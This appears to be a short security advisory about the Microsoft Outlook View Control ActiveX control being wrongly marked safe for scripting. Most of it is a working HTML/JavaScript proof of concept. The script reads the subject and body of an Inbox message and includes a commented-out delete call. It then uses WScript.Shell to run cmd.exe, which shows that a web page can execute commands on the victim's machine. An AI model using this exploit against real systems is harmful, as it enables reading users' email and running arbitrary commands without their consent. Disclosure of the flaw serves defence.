Microsoft Outlook introduces a vulnerability that may allow attackers to access and manipulate user email.

The vulnerability is due to a new ActiveX control called 'Microsoft Outlook View Control'. The flaw is that this control is marked 'safe for scripting' when it should not be. It is therefore accessible by scripts.

Scripts can access and perform operations on user email through this control without user knowledge or consent.

This assumes you have at least one message in Outlook XP's Inbox
<br>
<object id="o1"
classid="clsid:0006F063-0000-0000-C000-000000000046"
>
<param name="folder" value="Inbox">
</object>

<script>
function f()
{
//alert(o2.object);
sel=o1.object.selection;
vv1=sel.Item(1);
alert("Subject="+vv1.Subject);
alert("Body="+vv1.Body+"["+vv1.HTMLBody+"]");
alert("May be deleted");
//vv1.Delete();

vv2=vv1.Session.Application.CreateObject("WScript.Shell");

alert("Much more fun is possible");


vv2.Run("C:\\WINNT\\SYSTEM32\\CMD.EXE /c DIR /A /P /S C:\\ ");

}
setTimeout("f()",2000);
</script>
